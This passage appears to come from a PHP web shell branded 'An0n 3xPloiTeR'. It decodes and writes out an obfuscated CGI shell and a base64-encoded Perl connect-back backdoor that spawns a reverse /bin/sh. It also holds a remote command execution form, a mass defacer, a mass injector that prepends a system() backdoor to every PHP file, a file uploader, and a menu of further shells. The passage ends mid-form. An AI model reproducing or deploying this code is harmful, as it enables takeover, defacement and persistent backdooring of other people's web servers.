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';
							$file = fopen("izo.cin", "w+");
							$write = fwrite($file, htmlspecialchars_decode(gzinflate(base64_decode($cgishellizocin))));
							fclose($file);
							chmod("izo.cin", 0755);
							$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQogICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQoMSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAgICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1ZbMV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAgICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==';
							$file = fopen("dc.pl", "w+");
							$write = fwrite($file, base64_decode($netcatshell));
							fclose($file);
							chmod("dc.pl", 0755);
							echo "<iframe src=an0n_cgi/izo.cin width='100%' height='360' frameborder=0></iframe> ";
						}
					?>
					<?php
						if (isset($_GET['exec'])) {
							?><center><br><span class="def">Commands:</span>
							<form action="" method="POST">
								<textarea rows="8" cols="70" name="command" placeholder="Commands Here"></textarea><br><br>
								<input type="submit" name="submit" value="Submit">
							</form>
							<?php
							if (!empty($_POST['command']) && isset($_POST['submit'])) {
								function execute($in) {
							    $out = '';
							    if(function_exists('exec')) {
							        @exec($in,$out);
							        $out = @join("\n",$out);
							    }elseif(function_exists('passthru')) {
							        ob_start();
							        @passthru($in);
							        $out = ob_get_clean();
							    }elseif(function_exists('system')) {
							        ob_start();
							        @system($in);
							        $out = ob_get_clean();
							    }elseif(function_exists('shell_exec')) {
							        $out = shell_exec($in);
							    }elseif(is_resource($f = @popen($in,"r"))) {
							        $out = "";
							        while(!@feof($f))
							            $out .= fread($f,1024);
							        pclose($f);
							    }
							    return $out;
							}
								$commands = $_POST['command'];
								$result = @execute($commands);
								echo '<br><textarea rows="8" cols="70">'.$result.'</textarea>';
							}
						}
					?>
					<?php
					if (isset($_GET['defacer'])) {
						?>
							<center><br><font style="font-family: cursive; font-size: 170%; color: red;">An0n 3xPloiTeR Mass Defacer </font><br>
							<form ENCTYPE="multipart/form-data" action="" method=POST onSubmit="g(null,null,this.path.value,this.file.value,this.Contents.value);return false;"><span class="def">Folder:</span> <br><input type="text" name="path" size="60" value="<?php echo getcwd(); ?>">
							<br><span class="def">File name:</span> <br><input type="text" name="file" size="20" value="Pakistan_Zindabad.html"><br><span class="def">Content:</span>
							<br> <textarea type='text' name='Contents' cols="60" rows="8" placeholder="Deface Page Here :)"></textarea> 
							<br><input type=submit name="submit" value="Deface now"></p></form>
							<?php
							if (isset($_POST['path']) && !empty($_POST['file']) && !empty($_POST['Contents']) && isset($_POST['submit'])) {
								$mainpath = $_POST["path"];
								$file = $_POST["file"];
								$txtContents = $_POST["Contents"];
								$dir = opendir($mainpath);
								while ($row = readdir($dir)) {
								$start = @fopen("$row/$file", "w+");
								$code = $txtContents;
								$finish = @fwrite($start, $code);
								if ($finish) {
								echo "<span class='def'>http://$row/$file</span><br>";
								}
							}
						}
					}
					?>
					<?php
						if (isset($_GET['mass_injector'])) {
							?><br><center><br>
							<font style="color: teal; font-family: cursive; font-size: 200%;">ReV Mass Code Injector V2.0</font><br><br>
							<form action="" method="POST">
			<?php
				$console = '
<?php
if (isset($_REQUEST[cmd])) {
system ($_REQUEST[cmd]);
}
?>';
			?>
				<textarea type="text" name="code" rows="13" cols="80" placeholder="Enter Your Code Like This : <?php echo $console; ?>"></textarea><br><br>
				<input style="font-family: Comic Sans Ms; font-size: 90%;" type="submit" name="submit" value="Submit" />
			</form>
			<?php
				if (isset($_POST['submit'])) {
					$code = $_POST['code'];
					$code1 = base64_encode($code);
					$path = getcwd();
					$host = 'http://'.$_SERVER['HTTP_HOST'];
					$path_of_file = $_SERVER['SCRIPT_NAME'];
					$website_testing = $host.$path_of_file;
					$path = getcwd();
					$directory = $path;

					if (empty($code)) {
						echo '<font size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';
					}

					if (!empty($code)) {

							if ($handle = opendir($directory)) {
							echo '<span style="color: red; font-family: cursive; font-size: 110%;">'.'Website: '.$website_testing.'<br><br></span>';
							echo '<span style="color: teal; font-family: cursive; font-size: 110%;">Looking in '.$directory.'<br></span>';
							while ($files = readdir($handle)) {
								if ($files != '.' && $files != '..' && $files != 'rev.php' && $files != 'REV.php' && $files != '.htaccess' && $files != 'php.ini' && $files != 'admin' && $files != 'images' && $files != 'image' && $files != 'img' && $files != 'phpmyadmin' && $files != 'files' && $files != '.ftpquota' && $files != '.error_log' && strtolower(substr($files, strrpos($files, '.') + 1)) == 'php') {
								echo '<a style="color: red; font-family: cursive;" target="_blank" href="'.$files.'">'.$files.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
								$file_data = base64_decode($code1);
								$file_data .= file_get_contents($files);
								file_put_contents($files, $file_data); echo '<br>';
								} 
							}
						}
					}
				}
			}
		?>
		<?php
			if (isset($_GET['uploader'])) {
				?>
				<center><br><br>
				<font style="color: lawngreen; font-family: cursive; font-size: 250%;">An0n 3xPloiTeR's Uploader</font><br><br><br><br>
				<form method="POST" enctype="multipart/form-data" action="">
					<input style="font-size: 90%;" type="file" name="files">
					<input style="font-size: 90%;" type=submit value="Upload">
				</form>
				<?php
				$files = @$_FILES["files"];
				if ($files["name"] != '') {
				    $fullpath = $_REQUEST["path"] . $files["name"];
				    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
				        echo "<center><br><br><font style='color: red; font-family: cursive; font-size: 200%;'><a href='$fullpath' target='_blank'>Click to access uploaded File</a></font></center>";
				    }
				}
			}
		?>
		<?php
			if (isset($_GET['shells'])) {
				?>
				<center><br><font style="color: red; font-size: 200%; font-family: cursive;">Shells By An0n 3xPloiTeR</font></center><div class="content">
					<br>
					<table border="1%" align="center" cellpadding="10">
					<tr>
					<td><font style="color: teal; font-family: cursive; font-size: 120%;">Click And Get The Shells</font></td>
					<tr><td>
					<form action="" method="post"> 
					<input type = "submit" name="dhanush" value ="Dhanush Shell">
					</td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="anonghosts" value ="AnonGhosts Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
